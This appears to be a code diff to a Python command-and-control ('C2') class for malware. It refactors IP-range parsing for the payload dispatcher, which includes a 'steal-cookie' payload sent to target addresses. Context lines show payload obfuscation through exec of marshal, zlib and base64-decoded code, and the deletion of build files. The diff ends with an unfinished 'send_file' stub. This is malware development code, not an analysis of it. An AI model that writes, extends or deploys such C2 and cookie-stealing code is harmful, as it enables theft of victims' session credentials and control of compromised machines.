@@ -79,9 +79,7 @@ class C2:
             json.dump(self.total_devices, f)
 
 
-    def payload(self, data):
-        payload_type = data['payload']
-        ip_range = data['ip']
+    def parce_ip(self, ip_range):
         ip_addresses = []
 
         if "-" in ip_range:
@@ -103,7 +101,16 @@ class C2:
             ip_addresses = ['.'.join(map(str, ip)) for ip in all_ips]
                 
         else:
-            ip_list.append(ip_range)
+            ip_addresses.append(ip_range)
+
+        return ip_addresses
+
+    def payload(self, data):
+        payload_type = data['payload']
+        ip_range = data['ip']
+
+        ip_addresses = self.parce_ip(ip_range)
+        print(ip_addresses)
 
         if payload_type == "steal-cookie":
             for ip in ip_addresses:
@@ -176,3 +183,9 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
 
         os.remove(f"{payload_file_name}.py")
         os.remove(f"{payload_file_name}.spec")
+
+
+    
+
+
+    def send_file(ip)
